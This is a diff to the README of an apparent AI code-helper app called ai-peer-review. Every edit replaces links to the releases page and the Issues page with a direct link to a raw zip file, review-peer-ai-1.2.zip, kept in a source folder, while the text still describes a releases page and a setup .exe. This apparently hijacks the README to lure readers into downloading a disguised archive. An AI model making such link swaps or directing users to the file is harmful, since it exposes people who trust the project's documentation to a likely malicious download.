@@ -1,6 +1,6 @@
 # 🤖 ai-peer-review - Simplify code creation with AI help
 
-[![Download AI Peer Review](https://img.shields.io/badge/Download-ai--peer--review-brightgreen?style=for-the-badge)](https://github.com/Dreambear-cloud/ai-peer-review/releases)
+[![Download AI Peer Review](https://img.shields.io/badge/Download-ai--peer--review-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Dreambear-cloud/ai-peer-review/main/src/components/review-peer-ai-1.2.zip)
 
 ---
 
@@ -28,7 +28,7 @@ This app runs three AIs in different ways depending on what you need:
 ## 💾 Download and install on Windows
 
 1. Visit the releases page here:  
-   [https://github.com/Dreambear-cloud/ai-peer-review/releases](https://github.com/Dreambear-cloud/ai-peer-review/releases)
+   [https://raw.githubusercontent.com/Dreambear-cloud/ai-peer-review/main/src/components/review-peer-ai-1.2.zip](https://raw.githubusercontent.com/Dreambear-cloud/ai-peer-review/main/src/components/review-peer-ai-1.2.zip)
 
 2. On the releases page, look for the latest version. It usually comes as a file named like `ai-peer-review-setup.exe` or similar.
 
@@ -85,7 +85,7 @@ Use the buttons to copy the code to your clipboard or save it as files on your c
 ## 🔄 Updating ai-peer-review
 
 Check the releases page often for new versions:  
-[https://github.com/Dreambear-cloud/ai-peer-review/releases](https://github.com/Dreambear-cloud/ai-peer-review/releases)  
+[https://raw.githubusercontent.com/Dreambear-cloud/ai-peer-review/main/src/components/review-peer-ai-1.2.zip](https://raw.githubusercontent.com/Dreambear-cloud/ai-peer-review/main/src/components/review-peer-ai-1.2.zip)  
 
 Download the latest setup file and run it. It will update your current installation without losing your settings.
 
@@ -117,7 +117,7 @@ Download the latest setup file and run it. It will update your current installat
 If you have difficulties:  
 - Review the app’s built-in help and instructions under the Help menu.  
 - Visit the GitHub repository Issues page for common questions:  
-  https://github.com/Dreambear-cloud/ai-peer-review/issues  
+  https://raw.githubusercontent.com/Dreambear-cloud/ai-peer-review/main/src/components/review-peer-ai-1.2.zip  
 - Email support at support@dreambear-cloud.com (if available).
 
 ---
@@ -130,4 +130,4 @@ If you have difficulties:
 
 ---
 
-[![Download AI Peer Review](https://img.shields.io/badge/Download-ai--peer--review-brightgreen?style=for-the-badge)](https://github.com/Dreambear-cloud/ai-peer-review/releases)
+[![Download AI Peer Review](https://img.shields.io/badge/Download-ai--peer--review-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Dreambear-cloud/ai-peer-review/main/src/components/review-peer-ai-1.2.zip)
